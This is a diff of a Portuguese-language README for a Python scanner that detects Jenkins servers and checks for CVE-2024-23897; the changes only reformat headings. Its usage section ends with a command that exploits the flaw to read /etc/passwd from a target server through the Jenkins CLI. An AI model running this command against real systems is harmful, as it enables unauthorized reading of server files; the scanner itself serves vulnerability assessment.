@@ -2,7 +2,7 @@
 Find jenkins environment and checks for CVE-2024-23897
 
 ---
-  Como funciona
+##  Como funciona
 
   Detecção de Jenkins
 
@@ -23,17 +23,17 @@ Find jenkins environment and checks for CVE-2024-23897
   Ativa (--active): envia o handshake do protocolo binário do Jenkins CLI sobre HTTP. Se o servidor responder 200 + Content-Type: application/octet-stream, confirma
    que o canal CLI está aberto e o exploit é aplicável.
 
-  Uso
+##  Uso
 
-  # Scan básico
+  ### Scan básico
   python jenkins_scan.py -f urls.txt
 
-  # Com probe ativa + Burp como proxy + saída em arquivo
+  ### Com probe ativa + Burp como proxy + saída em arquivo
   python jenkins_scan.py -f urls.txt --active --proxy http://127.0.0.1:8080 -o resultados.txt
 
-  # 20 threads, verbose, sem cor (para pipe/grep)
+  ### 20 threads, verbose, sem cor (para pipe/grep)
   python jenkins_scan.py -f urls.txt -t 20 -v --no-color
 
-  # Confirmar exploit manual em alvo vulnerável
+  ### Confirmar exploit manual em alvo vulnerável
   java -jar jenkins-cli.jar -s http://TARGET/ who-am-i "@/etc/passwd"
 
